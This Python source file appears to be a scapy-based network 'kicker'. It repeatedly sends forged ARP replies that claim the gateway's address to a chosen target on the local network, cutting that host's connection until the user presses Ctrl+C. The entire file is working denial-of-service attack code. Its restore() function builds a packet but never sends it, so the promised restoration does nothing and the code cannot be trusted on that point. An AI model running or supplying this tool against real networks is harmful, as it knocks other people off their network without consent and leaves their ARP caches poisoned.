from scapy.all import *
from lib.colors import *
import sys
import logging

conf.verb = 0
logging.basicConfig(level=logging.INFO, format="[{0}%(levelname)s{1}][{2}%(asctime)s{1}]{3}%(message)s{1}".format(LGREEN, RST, BLUE, RD), datefmt="%H:%M:%S")

def gatewayIP():
    pkt = IP(dst="www.google.com", ttl=0)/TCP()
    answer = sr1(pkt)
    return answer[IP].src

class kickout:
    
    def __init__(self, tgtIP):
        self.tgtIP = tgtIP
        self.gateIP = gatewayIP()
        self.gateMAC = getmacbyip(self.gateIP)
        self.tgtMAC = getmacbyip(self.tgtIP)

    def kickone(self):
        pkt = ARP(op=2, psrc=self.gateIP, pdst=self.tgtIP, hwdst=self.gateMAC)
        send(pkt)

    def restore(self):
        pktgate = ARP(op=2, pdst=self.tgtIP, psrc=self.gateIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateMAC)

    def main(self):
        if self.tgtMAC == None or self.gateMAC == None:
            logging.info("{0}[{1}-{0}] {1}Couldn't get MAC address{0}".format(RST, RD))
            logging.info(" Exiting...")
            sys.exit(0)
        else:
            logging.info("{0}[{1}+{0}] {2}MAC address found:{0}".format(RST, LGREEN, RD))
            logging.info("{0}[{3}*{0}] {4}Gateway:{0} {1}{2}{0}".format(RST, GR, self.gateMAC, BLUE, RD))
            logging.info("{0}[{3}*{0}] {4}Target:{0} {1}{2}{0}".format(RST, GR, self.tgtMAC, BLUE, RD))
        logging.info("{0}[{1}+{0}] {2}Kicking target...{0}".format(RST, LGREEN, RD))
        logging.info("{0}[{1}+{0}] {2}Successfully kicked target{0}".format(RST, LGREEN, RD))
        count = 1
        while True:
            try:
                self.kickone()
                #logging.info("\rTarget kicked for {} seconds".format(count))
                sys.stdout.write("\r[{4}INFO{0}][{3}{2}{0}]{1} Seconds kicked{0} (Press CTRL+C to cancel)".format(RST, RD, count, GR, LGREEN))
                sys.stdout.flush()
                count += 2
                time.sleep(2)
            except KeyboardInterrupt:
                print("\n")
                logging.info(" Restoring target..")
                self.restore() 
                logging.info(" Exiting...")
                sys.exit(0)
